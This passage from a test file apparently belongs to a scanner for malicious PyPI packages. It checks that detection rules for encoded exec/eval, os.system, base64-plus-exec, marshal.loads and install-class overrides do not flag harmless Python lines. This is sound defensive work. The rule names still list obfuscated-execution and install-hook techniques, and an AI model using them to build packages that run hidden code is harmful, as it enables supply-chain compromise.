      expect(PYPI_SETUP_FILES.has("pyproject.toml")).toBe(true);
    });

    it("should include all expected Python extensions", () => {
      expect(PYTHON_EXTENSIONS.has(".py")).toBe(true);
      expect(PYTHON_EXTENSIONS.has(".pyw")).toBe(true);
      expect(PYTHON_EXTENSIONS.has(".pyi")).toBe(true);
    });
  });

  describe("Pattern non-matches (false positive avoidance)", () => {
    it("should not flag normal print statements as exec", () => {
      const code = 'print("Hello, world!")';
      const execPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_ENCODED",
      );
      expect(new RegExp(execPattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag normal import statements", () => {
      const code = "import base64";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_BASE64",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag os.path operations as os.system", () => {
      const code = 'result = os.path.join("/tmp", "file.txt")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_OS_SYSTEM",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag normal eval of literals", () => {
      // Plain eval without encoding should not match PYPI_EVAL_ENCODED
      const code = 'eval("1 + 1")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EVAL_ENCODED",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag normal class inheritance as install override", () => {
      const code = "class MyClass(BaseClass):";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_INSTALL_CLASS_OVERRIDE",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag marshal.dumps as marshal.loads", () => {
      const code = "marshal.dumps(data)";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_MARSHAL_LOADS",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag base64.b64decode without exec", () => {
      const code = 'data = base64.b64decode("aGVsbG8=")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_B64_EXEC_COMBINED",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });
  });
});
